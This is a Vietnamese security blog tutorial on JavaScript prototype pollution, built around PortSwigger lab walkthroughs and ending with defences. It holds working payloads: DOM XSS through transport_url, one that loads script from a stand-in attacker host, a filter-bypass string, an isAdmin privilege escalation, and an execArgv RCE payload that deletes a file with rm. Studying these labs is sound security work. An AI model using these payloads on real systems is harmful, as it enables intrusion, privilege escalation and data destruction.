---
layout: single
title: "prototype-pollution - Lỗ hổng Ô nhiễm nguyên mẫu trong JavaScript"
date: 2026-03-26
classes: wide
categories: [Penetration-Testing, web-security]
tags: [prototype-pollution, javascript, web-security, portswigger, nodejs, rce]
---

### **I.Ô nhiễm nguyên mẫu là gì?**

Tấn công làm ô nhiễm nguyên mẫu (prototype-pollution) là một lỗ hổng bảo mật cho phép các Attacker chèn các thuộc tính tùy ý vào các “global object prototypes” nhắm vào môi trường thực thi JavaScript, sau đó các thuộc tính kế thừa bởi các đối tượng mà người dùng định nghĩa

Thông qua tấn công này, kẻ tấn công có thể kiểm soát các giá trị mặc định của thuộc tính của một đối tượng. Điều này cho phép kẻ tấn công can thiệp vào logic của ứng dụng , có thể gây DOM XSS ở Client Side và cũng có thể dẫn đến từ chối dịch vụ hoặc, trong trường hợp nghiêm trọng có thể gây ra thực thi mã từ xa.

![/assets/images/prototype-pollution/image.png](/assets/images/prototype-pollution/image.png)

Sau khi đọc định nghĩa trên, có lẽ sẽ có ít nhất hàng tá câu hỏi nảy ra trong đầu. "Ghi đè thuộc tính đối tượng trong thời gian chạy" thực sự có nghĩa là gì? Nó có thể ảnh hưởng đến [bảo mật của ứng dụng](https://snyk.io/learn/application-security/?loc=learn) như thế nào ? Và quan trọng nhất, làm thế nào để bảo vệ code của mọi người khỏi cuộc tấn công này?

### **Về bài học lần này**

Việc tạo mẫu ô nhiễm có thể khá phức tạp, vì vậy chúng ta sẽ cùng tìm hiểu qua ba bước.

1. Bạn sẽ sử dụng kỹ thuật "Propotype pullution" để xâm nhập vào một API dễ bị tổn thương.
2. Bạn sẽ tìm hiểu thêm về các propotype JavaScript và cách thức gây ô nhiễm nguyên mẫu hoạt động.
3. Và bạn sẽ học cách khắc phục và ngăn ngừa hiện tượng "ô nhiễm nguyên mẫu" trong các ứng dụng của mình.

Nhưng trước hết đi vào cách tấn công , chúng ta hãy cũng tìm hiểu về cách hoạt động của propotype và kế thừa trong Javascript .

**JavaScript prototypes và tính kế thừa** 

Javascript sử dụng mô hình kế thừa nguyên mẫu , khá khác biệt so với mô hình dựa trên class được sử dụng của nhiều ngôn ngữ khác . Vậy trong javascript theo như các bạn biết , thì **Object** có nghĩa là gì ?

Về cơ bản, một Object trong JavaScript chỉ là một tập hợp `key:value`các cặp được gọi là "properties" hay còn gọi là thuộc tính . Ví dụ, đối tượng sau đây có thể đại diện cho một người dùng:

```
const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```

Bạn có thể truy cập các thuộc tính của một đối tượng bằng cách sử dụng ký hiệu dấu chấm hoặc ký hiệu dấu ngoặc vuông để tham chiếu đến các khóa tương ứng của chúng:

```
user.username     // "wiener"
user['userId']    // 01234
```

Bên cạnh dữ liệu, các thuộc tính cũng có thể chứa các hàm có thể thực thi. Trong trường hợp này, hàm đó được gọi là "method".

```
const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}
```

Ví dụ trên là một "đối tượng literal", có nghĩa là nó được tạo ra bằng cú pháp dấu ngoặc nhọn để khai báo rõ ràng các thuộc tính và giá trị ban đầu của chúng. Tuy nhiên, điều quan trọng cần hiểu là hầu hết mọi thứ trong JavaScript đều là một đối tượng ở bên trong. Trong suốt tài liệu này, thuật ngữ "đối tượng" đề cập đến tất cả các thực thể, không chỉ riêng các đối tượng literal.

## **1. Trong JavaScript, prototype là gì?**

Mỗi đối tượng trong JavaScript đều được liên kết với một đối tượng khác thuộc một loại nào đó, được gọi là nguyên mẫu (prototype) của nó. Theo mặc định, JavaScript tự động gán cho các đối tượng mới một trong những nguyên mẫu có sẵn của nó. Ví dụ, chuỗi (string) được tự động gán nguyên mẫu có sẵn là `<string>` `String.prototype`. Bạn có thể xem thêm một số ví dụ về các nguyên mẫu toàn cục này bên dưới:

```
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);	    // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```

Các đối tượng tự động kế thừa tất cả các thuộc tính của nguyên mẫu được gán cho chúng, trừ khi chúng đã có thuộc tính riêng với cùng khóa. Điều này cho phép các nhà phát triển tạo ra các đối tượng mới có thể tái sử dụng các thuộc tính và phương thức của các đối tượng hiện có.

Các nguyên mẫu tích hợp sẵn cung cấp các thuộc tính và phương thức hữu ích để làm việc với các kiểu dữ liệu cơ bản. Ví dụ,object  `String.prototype` có một method là `toLowerCase()`. Kết quả là, tất cả các chuỗi đều tự động có một phương thức sẵn sàng sử dụng để chuyển đổi chúng thành chữ thường. Điều này giúp các nhà phát triển không cần phải thêm thủ công hành vi này vào mỗi chuỗi mới mà họ tạo ra.

**Cơ chế kế thừa đối tượng trong JavaScript hoạt động như thế nào?**

Mỗi khi bạn tham chiếu đến một thuộc tính của một đối tượng, công cụ JavaScript trước tiên sẽ cố gắng truy cập trực tiếp thuộc tính đó trên chính đối tượng. Nếu đối tượng không có thuộc tính phù hợp, công cụ JavaScript tìm kiếm thuộc tính đó trên nguyên mẫu của đối tượng. Với các đối tượng sau, điều này cho phép bạn tham chiếu đến `myObject.propertyA`, ví dụ:

![Kế thừa nguyên mẫu trong JavaScript](/assets/images/prototype-pollution/inheritance.svg)

Bạn có thể sử dụng bảng điều khiển trình duyệt để xem quá trìnhnày diễn ra như thế nào. Đầu tiên, hãy tạo một object trống

```
let myObject = {};
```

Tiếp theo, gõ lệnh `myObject`rồi đến dấu chấm. Sau đó bạn sẽ thấy  rằng bảng điều khiển sẽ nhắc bạn chọn từ một danh sách các thuộc tính và phương thức:

![Kiểm tra tính kế thừa nguyên mẫu trong bảng điều khiển trình duyệt](/assets/images/prototype-pollution/console-screenshot.png)

Mặc dù bản thân đối tượng không có thuộc tính hoặc phương thức nào được định nghĩa, nhưng nó đã kế thừa một số thuộc tính hoặc phương thức từ các đối tượng tích hợp sẵn `Object.prototype`.

The Propotype chain

Lưu ý rằng nguyên mẫu của một đối tượng chỉ là một đối tượng khác, và đối tượng đó cũng cần có nguyên mẫu riêng của nó, cứ thế tiếp tục. Vì hầu như mọi thứ trong JavaScript đều là đối tượng ở bên trong, nên chuỗi này cuối cùng dẫn trở lại cấp cao nhất `Object.prototype`, mà nguyên mẫu của nó chỉ đơn giản là `null`.

![Chuỗi nguyên mẫu JavaScript](/assets/images/prototype-pollution/prototype-chain.svg)

Điều quan trọng là, các đối tượng kế thừa thuộc tính không chỉ từ nguyên mẫu trực tiếp của chúng, mà còn từ tất cả các đối tượng nằm trên chúng trong chuỗi nguyên mẫu. Trong ví dụ trên, điều này có nghĩa là `username`đối tượng có quyền truy cập vào các thuộc tính và phương thức của cả hai `String.prototype`đối tượng kia `Object.prototype`.

## **2. Truy cập vào prototype của một đối tượng bằng cách sử dụng __proto__**

Mỗi đối tượng đều có một thuộc tính đặc biệt mà bạn có thể sử dụng để truy cập vào nguyên mẫu của nó. Mặc dù thuộc tính này không có tên gọi được chuẩn hóa chính thức, nhưng `__proto__`nó là tiêu chuẩn thực tế được hầu hết các trình duyệt sử dụng. Nếu bạn quen thuộc với các ngôn ngữ lập trình hướng đối tượng, thuộc tính này đóng vai trò vừa là phương thức lấy giá trị (getter) vừa là phương thức thiết lập giá trị (setter) cho nguyên mẫu của đối tượng. Điều này có nghĩa là bạn có thể sử dụng nó để đọc nguyên mẫu và các thuộc tính của nó, và thậm chí gán lại giá trị cho chúng nếu cần.

Cũng như bất kỳ thuộc tính nào khác, bạn có thể truy cập chúng `__proto__`bằng cách sử dụng cú pháp ngoặc vuông hoặc dấu chấm:

```
username.__proto__
username['__proto__']
```

Bạn thậm chí có thể xâu chuỗi các tham chiếu để `__proto__`lần lượt đi lên chuỗi nguyên mẫu:

```
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```


Nguồn tham khảo : [https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance)

Vậy qua đó chúng ta có thể thấy rằng….**Các lỗ hổng bảo mật do ô nhiễm trong quá trình chế tạo nguyên mẫu xảy ra như thế nào?**

Về cơ bản, prototype-pollution xảy ra khi kẻ tấn công tìm cách đưa các thuộc tính độc hại vào **Prototype** (nguyên mẫu) của một đối tượng.

Trong JavaScript, hầu hết các đối tượng đều kế thừa từ `Object.prototype`. Nếu một thuộc tính được thêm vào đây, **mọi đối tượng trong ứng dụng** đều sẽ "vô tình" sở hữu thuộc tính đó.

### **II. Lỗ hổng này phát sinh như thế nào?**

Lỗ hổng **prototype-pollution** (Ô nhiễm nguyên mẫu) thường xuất hiện khi một hàm JavaScript thực hiện hợp nhất (merge) đệ quy một đối tượng từ người dùng vào một đối tượng hiện có mà không kiểm tra kỹ các khóa (keys).

Kẻ tấn công có thể lợi dụng điều này để chèn thêm các khóa đặc biệt như `__proto__` kèm theo các thuộc tính độc hại. Do `__proto__` có ý nghĩa đặc biệt trong JavaScript (là thuộc tính truy cập đến prototype), thao tác `merge` lúc này sẽ không gán thuộc tính vào đối tượng đích mà lại gán thẳng vào **nguyên mẫu (prototype)** của đối tượng đó. Kết quả là mọi đối tượng kế thừa từ nguyên mẫu này (thường là `Object.prototype`) đều sẽ mang giá trị độc hại mà kẻ tấn công đã cài cắm.

### **3 yếu tố then chốt để khai thác thành công**

Để biến lỗi ô nhiễm thành một cuộc tấn công thực thụ, cần có sự kết hợp của 3 thành phần:

1. **Nguồn gây ô nhiễm (Source):** Bất kỳ đầu vào nào cho phép người dùng đưa các thuộc tính tùy ý vào đối tượng nguyên mẫu.
2. **Điểm tiếp nhận (Sink):** Một hàm JavaScript hoặc phần tử DOM cho phép thực thi mã hoặc câu lệnh hệ thống.
3. **Thiết bị trung gian (Gadget):** Một thuộc tính được đưa vào "Sink" mà không qua lọc hay khử trùng, cho phép kẻ tấn công điều khiển hành vi ứng dụng thông qua việc làm ô nhiễm thuộc tính đó.

---

### **Các nguồn gây ô nhiễm phổ biến**

Kẻ tấn công thường "bơm" mã độc qua các con đường sau:

- **URL (Query string & Hash):** Trình phân tích URL có thể coi `__proto__` là một chuỗi bình thường.
    - *Ví dụ:* `https://vulnerable-website.com/?__proto__[evilProperty]=payload`
    - Khi thực hiện merge, thay vì tạo ra `{__proto__: {evilProperty: 'payload'}}`, hệ thống lại thực thi lệnh tương đương: `targetObject.__proto__.evilProperty = 'payload'`.
- **Dữ liệu đầu vào JSON:** Phương thức `JSON.parse()` coi mọi khóa trong JSON là chuỗi thông thường, kể cả `__proto__`. Điều này cho phép kẻ tấn công gửi các đối tượng JSON độc hại qua tin nhắn web (web messages) hoặc API để làm ô nhiễm môi trường chạy của ứng dụng.

---

### **Sink và Gadget: Từ ô nhiễm đến thực thi mã độc**

**Sink** có thể hiểu là những "điểm yếu" trong mã nguồn nơi mà các thuộc tính bị kiểm soát bởi kẻ tấn công được sử dụng.

Một **Gadget** thực thụ xuất hiện khi ứng dụng sử dụng một thuộc tính theo cách không an toàn. Hãy tưởng tượng một thư viện JavaScript dùng để cấu hình script như sau:

JavaScript

`let transport_url = config.transport_url || defaults.transport_url;
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;`

Nếu lập trình viên chưa định nghĩa `config.transport_url`, kẻ tấn công có thể làm ô nhiễm `Object.prototype.transport_url`. Lúc này, thuộc tính độc hại sẽ được đối tượng `config` kế thừa và ứng dụng sẽ tự động tải file JS từ server của kẻ tấn công:
`https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`

Thậm chí, kẻ tấn công có thể nhúng trực tiếp mã XSS thông qua `data:URL`:
`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`

# III.Ô nhiễm nguyên mẫu phía máy khách và máy chủ


## **Client-side prototype-pollution vulnerabilities**

Sau khi tìm hiểu chi tiết về cách thức hoạt động của prototype cũng như lý do tại sao nó bị khi thác , thì chúng ta sẽ học cách tìm các lỗ hổng tấn công ở phía client side trong môi trường thực tế

1. **Manually testing** : Việc tìm kiếm các nguồn gây ô nhiễm nguyên mẫu theo 1 cách thủ công chủ yếu là theo quá trình thử và sai . Có nghĩa là bạn có thể thử nhiều cách khác nhau cho tới khi thêm được 1 thuộc tính bất kỳ cho Object.Propotype đến khi tìm được 1 nguồn phù hợp 

Ví dụ minh họa 

1. Hãy thử chèn một thuộc tính tùy ý thông qua chuỗi truy vấn, đoạn URL và bất kỳ dữ liệu JSON nào. Ví dụ:`vulnerable-website.com/?__proto__[foo]=bar`
2. Trong bảng điều khiển trình duyệt, hãy kiểm tra `Object.prototype`xem bạn đã thành công trong việc làm ô nhiễm nó bằng thuộc tính tùy ý của mình hay chưa:`Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful`
3. Nếu thuộc tính đó chưa được thêm vào nguyên mẫu, hãy thử sử dụng các kỹ thuật khác, chẳng hạn như chuyển sang ký hiệu dấu chấm thay vì ký hiệu dấu ngoặc vuông, hoặc ngược lại:`vulnerable-website.com/?__proto__.foo=bar`
4. Lặp lại quy trình này cho từng Source mà bạn nghĩ là có thể khai thác được

**Nếu cả hai kỹ thuật trên đều không thành công, bạn vẫn có thể làm [ô nhiễm nguyên mẫu thông qua hàm tạo của nó](https://portswigger.net/web-security/prototype-pollution/client-side#prototype-pollution-via-the-constructor) . Chúng ta sẽ tìm hiểu chi tiết hơn về cách thực hiện điều này ở phần sau.**

## **b. Tìm kiếm các tiện ích gây ô nhiễm nguyên mẫu phía máy khách bằng DOM Invader**

Như bạn thấy từ các bước trước, việc tự tay xác định các thiết bị gây ô nhiễm mã độc trong thực tế có thể là một công việc tốn nhiều công sức. Vì các trang web thường dựa vào nhiều thư viện của bên thứ ba, việc này có thể liên quan đến việc đọc qua hàng nghìn dòng mã được thu gọn hoặc làm mờ, khiến mọi thứ trở nên phức tạp hơn. 
DOM Invader có thể tự động quét các thiết bị gây ô nhiễm thay mặt bạn và thậm chí có thể tạo ra bằng chứng về lỗ hổng DOM XSS trong một số trường hợp. Điều này có nghĩa là bạn có thể tìm thấy các lỗ hổng trên các trang web thực tế chỉ trong vài giây thay vì hàng giờ.

Để biết về thông tin chi tiết về DOM invader thì bạn có thể đọc bài viết này 
https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets

Để có thể minh họa cách tấn công cụ thể thì chúng ta hãy cùng xem bài lab của PortSwigger nhé

![/assets/images/prototype-pollution/image-1.png](/assets/images/prototype-pollution/image-1.png)

Bài này mình sẽ demo cả 2 cách thủ công và cả dùng DOM invader

Bài này có 1 lỗ hổng DOM XSS được khai thác thông qua việc làm ô nhiễm Propotype phía máy khách . Để giải quyết bài thực hành thì cần 3 bước chính 

- Hãy tìm một nguồn mà bạn có thể sử dụng để thêm các thuộc tính tùy ý vào biến toàn cục. `Object.prototype`.
- Hãy xác định một thuộc tính của tiện ích cho phép bạn thực thi mã JavaScript tùy ý.
- Kết hợp những điều này để gọi `alert()`.

Thì giải pháp đầu tiên là thử thủ công 

- Trong trình duyệt của bạn, hãy thử gây ô nhiễm `Object.prototype`bằng cách chèn một thuộc tính tùy ý thông qua chuỗi truy vấn: `/?__proto__[foo]=bar`
- Mở bảng DevTools của trình duyệt và chuyển đến  **tab Console**  .
- Đi vào `Object.prototype`.
- Hãy xem  các thuộc tính của đối tượng được trả về. Quan sát thấy rằng giờ đây nó có một `foo` có giá trị `bar`Bạn đã tìm thấy thành công một propotype pollution source

![/assets/images/prototype-pollution/image-2.png](/assets/images/prototype-pollution/image-2.png)

Tiếp tục tìm trong source để tìm được các source có thể khai thác thì mình thấy được 1 hàm searchLogger này

![/assets/images/prototype-pollution/image-3.png](/assets/images/prototype-pollution/image-3.png)

- Đối tượng `config` được khởi tạo chỉ với duy nhất thuộc tính `params`. Lập trình viên kiểm tra `if(config.transport_url)` với ý định là: *"Nếu tôi có định nghĩa thuộc tính này ở đâu đó thì mới chạy"*.
- **Cơ chế kế thừa:** Do `config` là một đối tượng JavaScript thông thường, nó kế thừa từ `Object.prototype`.
- **Lỗ hổng:** Nếu kẻ tấn công có thể làm ô nhiễm `Object.prototype` và thêm vào đó một thuộc tính tên là `transport_url`, thì câu lệnh `if(config.transport_url)` sẽ trả về **true**, và giá trị đó sẽ được gán thẳng vào src của `script`

Do đó hãy thử khai thác bằng cách thử 1 đường dẫn `/?__proto__[transport_url]=foo`

![/assets/images/prototype-pollution/image-4.png](/assets/images/prototype-pollution/image-4.png)

Trong bảng DevTools của trình duyệt, hãy chuyển đến  **tab Elements**  và nghiên cứu nội dung HTML của trang. Quan sát thấy rằng... `<script>` đã được hiển thị trên trang, với `src` thuộc tính `foo`.
                         
Sau đó mình sẽ sửa đổi phần dữ liệu trong URL để chèn 
mã XSS chứng minh khái niệm. Ví dụ, bạn có thể sử dụng... `data:`URL như sau:

```
/?__proto__[transport_url]=data:,alert(1);
```

![/assets/images/prototype-pollution/image-5.png](/assets/images/prototype-pollution/image-5.png)

Và đây là kết quả , hộp thoại alert đã hiển lên cảnh báo , chứng tỏ rằng mình đã khai thác DOM XSS bằng propotype pollution thành công

Còn về cách dùng DOM Invader thì bạn mở trình duyệt của Burp lên và bật chế độ này lên 

![/assets/images/prototype-pollution/image-6.png](/assets/images/prototype-pollution/image-6.png)

1. Mở phòng thí nghiệm trong trình duyệt tích hợp sẵn của Burp.
2. [Kích hoạt DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) và [bật tùy chọn "prototype-pollution"](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution) .
3. Mở bảng DevTools của trình duyệt, chuyển đến tab **DOM Invader** , sau đó tải lại trang.
4. Hãy lưu ý rằng DOM Invader đã xác định được hai vectơ gây ô nhiễm nguyên mẫu trong `search`thuộc tính, cụ thể là chuỗi truy vấn.

![/assets/images/prototype-pollution/image-7.png](/assets/images/prototype-pollution/image-7.png)

1. Nhấp vào Scan for gadgets . Một tab mới sẽ mở ra, trong đó DOM Invader bắt đầu quét tìm các tiện ích bằng nguồn đã chọn.
2. Khi quá trình quét hoàn tất, hãy mở bảng DevTools trong cùng tab với quá trình quét, sau đó chuyển đến tab **DOM Invader** .
3. Hãy lưu ý rằng DOM Invader đã truy cập thành công vào `script.src`sink thông qua `transport_url`tiện ích.

![/assets/images/prototype-pollution/image-8.png](/assets/images/prototype-pollution/image-8.png)

1. Nhấp vào Exploit . DOM Invader tự động tạo ra một mã khai thác thử nghiệm và gọi hàm đó `alert(1)`. và đây là kết quả

![/assets/images/prototype-pollution/image-9.png](/assets/images/prototype-pollution/image-9.png)

c. prototype-pollution thông qua constructor

Cho đến bây giờ , chúng ta chỉ mới biết cách bạn có thể lấy tham chiếu đến các đối tượng nguyên mẫu thông qua thuộc tính __**Proto**__ . Vì đây là kĩ thuật kinh điển nên có 1 biện pháp bảo vệ phổ biến là loại bỏ bất kì thuộc tính nào có khóa __Proto__ khỏi các object do người dùng đưa vào trước khi merge chúng . Nhưng còn có những cách khác để tiếp cận mà ko cần phải dựa vào __Proto__ .

Mọi object trong JS đều có 1 phương thức hay còn gọi là constructor ( như đã đề cập ở trên) , chứa tham chiếu tới hàm được sử dụng để tạo ra nó . 

Ví dụ, bạn có thể tạo một đối tượng mới bằng cách sử dụng cú pháp trực tiếp hoặc bằng cách gọi hàm `Object()`tạo một cách rõ ràng như sau:

```
let myObjectLiteral = {};
let myObject = new Object();
```

Sau đó, bạn có thể tham chiếu đến `Object()`hàm tạo thông qua thuộc tính tích hợp sẵn `constructor`:

```
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```

Ngoài ra bạn cũng có thể truy cập bằng cách này 

Do đó, bạn cũng có thể truy cập nguyên mẫu của bất kỳ đối tượng nào như sau:

```
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

Vì `myObject.constructor.prototype`tương đương với `myObject.__proto__`, điều này cung cấp một hướng thay thế cho sự ô nhiễm nguyên mẫu.

![/assets/images/prototype-pollution/image-10.png](/assets/images/prototype-pollution/image-10.png)

Tiếp theo là 1 bài bypass khi trang web này đã ngăn chặn việc khai thác lỗ hổng bằng cách làm sạch các thuộc tính trước khi merge vào 1 object. 

Thông thường, để chống lại prototype-pollution, lập trình viên sẽ tạo ra một  (blacklist) để loại bỏ các từ khóa nguy hiểm như `__proto__`, `constructor`, hay `prototype`.

Trong tệp `searchLoggerFiltered.js`, bài Lab này sử dụng hàm `sanitizeKey()` để lọc các chuỗi này. Tuy nhiên, sai lầm chết người ở đây là: **Bộ lọc này không có tính đệ quy (non-recursive).**

![/assets/images/prototype-pollution/image-11.png](/assets/images/prototype-pollution/image-11.png)

### Cách thức vượt rào (Bypass):

Nếu mã nguồn chỉ đơn giản là tìm chuỗi `__proto__` và xóa nó đi **một lần duy nhất**, chúng ta có thể "lồng" từ khóa đó vào giữa chính nó.

- **Payload:** `__pro__proto__to__`
- **Khi đi qua bộ lọc:** Hệ thống tìm thấy cụm `__proto__` ở giữa và xóa nó.
- **Kết quả còn lại:** Hai phần đầu và đuôi (`__pro` + `to__`) sẽ dính lại với nhau, tạo thành một chuỗi `__proto__` hoàn chỉnh và "sạch sẽ" vượt qua kiểm tra.

Sau khi đã biết cách tiêm thuộc tính vào `Object.prototype`, chúng ta cần tìm một nơi mà thuộc tính đó được sử dụng để gây hại.

Trong tệp `searchLogger.js`, bạn sẽ thấy đoạn mã xử lý một đối tượng gọi là `config`. Đoạn mã này kiểm tra xem thuộc tính `transport_url` có tồn tại hay không. Nếu có, nó sẽ tạo ra một thẻ `<script>` và gán giá trị đó vào thuộc tính `src`.

JavaScript

`// Mã giả định trong script
if (config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.head.appendChild(script);
}`

**Vấn đề là:** Đối tượng `config` này không hề được định nghĩa thuộc tính `transport_url` một cách rõ ràng. Do đó, nó sẽ mò lên "cha" của nó là `Object.prototype` để tìm. Đây chính là lúc chúng ta có thể lợi dụng để khai thác

Mục tiêu của chúng ta là:

1. Vượt qua bộ lọc để gây ô nhiễm `Object.prototype.transport_url`.
2. Gán giá trị cho nó sao cho có thể thực thi JavaScript.

### Tại sao dùng `data:,alert(1)`?

Vì thuộc tính `src` của thẻ `<script>` yêu cầu một URL. Nếu bạn chỉ đưa vào `alert(1)`, trình duyệt sẽ cố tải một file có tên là `alert(1)` từ máy chủ và thất bại.
Sử dụng **Data URL scheme** (`data:`) cho phép chúng ta nhúng trực tiếp mã thực thi vào ngay trong thuộc tính `src`.

### Payload cuối cùng:

`/?__pro__proto__to__[transport_url]=data:,alert(1);`

1. **Sanitization:** `__pro__proto__to__` bị lọc thành `__proto__`.
2. **Pollution:** `Object.prototype.transport_url` bị gán bằng `"data:,alert(1);"`.
3. **Execution:** Script của trang web khởi tạo, thấy `config.transport_url` (thừa kế từ prototype), tạo ra thẻ `<script src="data:,alert(1);">`.

![/assets/images/prototype-pollution/image-12.png](/assets/images/prototype-pollution/image-12.png)

## **Server-side prototype-pollution**

Bên phía Client (trình duyệt), nếu mọi người khai thác nhầm, chỉ cần nhấn F5 là xong, mọi thứ lại sạch sẽ. Nhưng trên Server, câu chuyện lại khác hẳn. Một khi  đã làm ô nhiễm cái `Object.prototype`, cái chất độc mình truyền vào văn sẽ nằm lì ở đó, ảnh hưởng toàn bộ các hoạt động của máy chủ cho đến khi nào server sập hoặc được khởi động lại thì thôi.

**Vấn đề nằm ở chỗ:** Chúng ta đang tấn công vào một "hộp đen" (Black-box), sẽ không có Tab Console để kiểm tra xem mình đã chèn thuộc tính thành công chưa, cũng chẳng có Tab Sources để xem code logic của họ viết gì. 

Để có thể hình dung rõ hơn thì các bạn có thể xem qua bài lab dưới đây

![/assets/images/prototype-pollution/image-13.png](/assets/images/prototype-pollution/image-13.png)

### 1. Bản chất lỗi (Server-side)

Trong Node.js, khi server dùng vòng lặp `for...in` để trả về dữ liệu JSON, nó sẽ liệt kê luôn cả các thuộc tính mà nó kế thừa từ `Object.prototype`. Nếu ta "đầu độc" được prototype, server sẽ tự "khai" ra trong Response.

### 2. Các bước giải Lab

**Bước 1:** 

- Đăng nhập `wiener:peter`.
- Vào phần cập nhật hồ sơ, bắt request bằng Burp Suite.
- Chèn thêm payload vào JSON:JSON
    
    `{
        "username": "wiener",
        "__proto__": { "foo": "bar"}
    }`
    

Lưu ý rằng đối tượng trong phản hồi hiện bao gồm thuộc tính tùy ý mà bạn đã chèn vào, nhưng không có `__proto__`. Điều này cho thấy rõ ràng rằng bạn đã làm ô nhiễm thành công 
nguyên mẫu của đối tượng và thuộc tính của bạn đã được kế thừa thông qua
 chuỗi nguyên mẫu.
                         

![/assets/images/prototype-pollution/image-14.png](/assets/images/prototype-pollution/image-14.png)

Để ý trước khi chèn lệnh độc hại và gửi request gốc thì phản hồi có chứa isAdmin : false , vậy mục tiêu đề ra là leo thang đặc quyền với prototype bằng true 

```
"__proto__": {
    "isAdmin":true
}
```

![/assets/images/prototype-pollution/image-15.png](/assets/images/prototype-pollution/image-15.png)

và sau đó truy cập admin panel và xóa thành công tài khoản Carlos

![/assets/images/prototype-pollution/image-16.png](/assets/images/prototype-pollution/image-16.png)

Bài lab cuối cùng tôi muốn demo là 1 bài lab dẫn tới RCE khá nghiêm trọng

![/assets/images/prototype-pollution/image-17.png](/assets/images/prototype-pollution/image-17.png)

### 1. Tại sao lại là RCE?

Trong Node.js, có một mô-đun gọi là `child_process`. Các lập trình viên thường dùng nó để chạy các tiến trình con (ví dụ: chạy một script dọn dẹp database, xử lý file ảnh...).

Các phương pháp như `child_process.spawn()` Và `child_process.fork()`Cho phép các nhà phát triển tạo ra các tiến trình con  mới. `fork()`Phương thức này chấp nhận một Object tùy chọn, trong đó một trong các tùy chọn tiềm năng là `execArgv`Thuộc tính này là một mảng các chuỗi chứa các đối số dòng lệnh cần được sử dụng khi tạo tiến trình con. 

Khi một tiến trình con được tạo ra (thông qua hàm `fork()`), nó sẽ nhìn vào một thuộc tính gọi là `execArgv`. Nếu lập trình viên không định nghĩa nó, Node.js sẽ mò lên `Object.prototype`.

- **Cơ hội của chúng ta:** Nếu mình "đầu độc" được `Object.prototype.execArgv`, mình có thể nhét thêm tham số `-eval` vào. Tham số này cho phép thực thi bất kỳ đoạn mã JavaScript nào ngay khi tiến trình con vừa khởi động.

### 2. Các bước khai thác

**Bước 1:** 
Trước khi chạy lệnh nguy hiểm, mình cần biết chắc chắn server có bị hổng hay không. Có một mẹo cực hay là dùng thuộc tính `json spaces`.

- Gửi Request cập nhật địa chỉ với Payload , payload này để có thể chắc rằng có lỗ hổng hay không
    
    `"__proto__": { "json spaces": 10 }`
    
- Lưu ý rằng khoảng cách thụt lề JSON đã tăng lên dựa trên giá trị của thuộc tính bạn đã chèn. Điều này cho thấy rất có thể bạn đã làm sai lệch nguyên mẫu thành công.

![/assets/images/prototype-pollution/image-18.png](/assets/images/prototype-pollution/image-18.png)

**Bước 2:** 
Vào bảng Admin, thấy nút **"Run maintenance jobs"**. Khi bấm nút này, server sẽ chạy các tác vụ ngầm (tạo tiến trình con). Đây chính là lúc cái `execArgv` độc hại của mình được kích hoạt.

**Bước 3:** 
Mục tiêu của bài Lab là xóa file `/home/carlos/morale.txt`. Mình sẽ dùng `require('child_process').execSync()` để chạy lệnh hệ thống `rm` (remove).

Payload gửi qua Burp Suite (trong phần thay đổi địa chỉ):

JSON

`"__proto__": {
    "execArgv": [
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}`

**Bước 4:** 

- Sau khi gửi Payload ở Bước 3, cậu quay lại trang Admin.
- Bấm nút **"Run maintenance tasks"**.
- Server sẽ khởi động tiến trình con -> nó lấy cái `execArgv` từ Prototype -> nó chạy lệnh `rm` của cậu.
- **Kết quả:** File bị xóa, bài Lab được giải quyết!

![/assets/images/prototype-pollution/image-19.png](/assets/images/prototype-pollution/image-19.png)

# IV. Cách ngăn chặn lỗ hổng prototype-pollution

Nãy giờ nói về cách khai thác nhiều rồi, thì cũng nên biết về cách ngăn chặn và bảo vệ chúng . 

Các

### 1. Lọc dữ liệu đầu vào (Sanitization)

Chặn các từ khóa như `__proto__`, `constructor`, `prototype` trước khi xử lý.

- **Lưu ý:** Nên dùng **Allowlist** (chỉ cho phép những thuộc tính đã biết) thay vì Blacklist để tránh bị bypass.Nếu có dùng thì hãy filter kĩ ,  cẩn thận với các chiêu trò bypass kiểu `__pro__proto__to__` mà mình đã nhắc ở bài trước.

### 2. Đóng băng Prototype

Dùng lệnh này ngay khi khởi động ứng dụng để ngăn mọi thay đổi vào "gốc" của Object.Không ai có thể thêm , sửa , xóa bất kì thứ gì trong đó nữa 

`Object.freeze(Object.prototype);`

### 3. Tạo Object không có Prototype

Khi tạo Object mới để chứa dữ liệu, hãy dùng `Object.create(null)`. Object này sẽ không kế thừa bất kỳ thứ gì, nên kẻ tấn công không thể "đầu độc" nó.

`let safeObj = Object.create(null);`

### 4. Dùng Map hoặc SET thay cho Object

Thay vì dùng `{}` để lưu dữ liệu, hãy dùng `new Map()`.

- **Lợi ích:** Hàm `.get()` của Map chỉ trả về những gì cậu chủ động thêm vào, nó phớt lờ hoàn toàn các thuộc tính bị ô nhiễm từ Prototype.

`let data = new Map();
data.set('key', 'value');
data.get('__proto__'); // Trả về undefined (An toàn)`

### **Lời kết**

